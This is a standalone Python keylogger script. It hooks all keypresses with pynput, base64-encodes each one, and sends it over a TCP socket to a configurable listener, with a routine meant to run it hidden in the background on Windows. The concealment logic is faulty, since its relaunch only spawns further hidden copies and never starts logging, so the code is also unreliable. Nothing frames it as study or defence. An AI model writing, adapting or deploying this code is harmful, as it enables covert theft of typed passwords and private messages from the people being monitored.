import os
import sys
import socket
import subprocess
import base64
from pynput.keyboard import Listener, Key

host = '127.0.0.1'
port = 12345

def hide_console_window():
    if sys.platform.startswith('win'):
        subprocess.Popen(["cmd", "/C", "start", "/B", "python", "{}".format(__file__), "hide"])

def encode_data(data):
    return base64.b64encode(data.encode()).decode()

def send_key(key):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
        client_socket.connect((host, port))
        encrypted_key = encode_data(str(key))
        client_socket.sendall(encrypted_key.encode())

def on_press(key):
    try:
        send_key(key.char)
    except AttributeError:
        send_key(key)

def on_release(key):
    if key == Key.esc:
        return False

def main():
    if len(sys.argv) > 1 and sys.argv[1] == "hide":
        hide_console_window()
        return

    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if __name__ == "__main__":
    main()

